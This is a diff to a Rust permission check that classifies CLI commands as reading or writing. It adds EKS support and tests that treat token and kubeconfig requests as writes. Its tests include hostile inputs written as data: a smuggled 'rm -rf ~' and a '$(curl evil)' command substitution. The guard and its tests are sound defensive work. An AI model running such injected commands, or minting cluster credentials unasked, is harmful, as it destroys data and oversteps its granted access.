@@ -940,7 +940,7 @@ pub fn writes(command: &str) -> bool {
             // choose what to read. Anything else may act, or bill (Logs Insights, Cost Explorer).
             let commands = [
                 "status", "history", "list", "matrix", "logs", "tail", "report", "optimize", "costs", "advisor", "alarms", "approvals",
-                "lambda", "ecs", "apigw", "aurora", "redshift", "dms", "cfn", "s3", "sfn", "sqs", "ddb", "events", "flags", "dns", "param",
+                "lambda", "ecs", "eks", "apigw", "aurora", "redshift", "dms", "cfn", "s3", "sfn", "sqs", "ddb", "events", "flags", "dns", "param",
                 "secret",
             ];
             let acting = [
@@ -952,7 +952,7 @@ pub fn writes(command: &str) -> bool {
             let reading = [
                 "--json", "--since", "--filter", "--follow", "-f", "--full", "--days", "--service", "--report", "--md", "--by-cost",
                 "--ledger", "--limit", "-n", "--range", "--usage", "--daily", "--commitments", "--config", "--all", "--help", "-h",
-                "--type", "--name", "--tasks",
+                "--type", "--name", "--tasks", "--pods",
             ];
             !words.get(1).is_some_and(|w| commands.contains(&w.as_str()))
                 || words.iter().skip(1).any(|w| acting.contains(&w.as_str()))
@@ -1171,6 +1171,11 @@ mod tests {
         assert!(writes("dcli ecs prod checkout-web --force-deploy"));
         assert!(writes("dcli ecs prod checkout-web --desired 0 --yes"));
         assert!(writes("dcli ecs prod checkout-web --rollback"));
+        assert!(!writes("dcli eks prod shop-prod --pods --json"));
+        assert!(!writes("dcli eks prod shop-prod --report"));
+        // A bearer token for the cluster, and a file written: never run for Claude.
+        assert!(writes("dcli eks prod shop-prod --token"));
+        assert!(writes("dcli eks prod shop-prod --kubeconfig"));
         assert!(writes("terraform apply"));
         assert!(writes("aws lambda get-function --function-name x;rm -rf ~"));
         assert!(writes("aws lambda get-function --function-name $(curl evil)"));
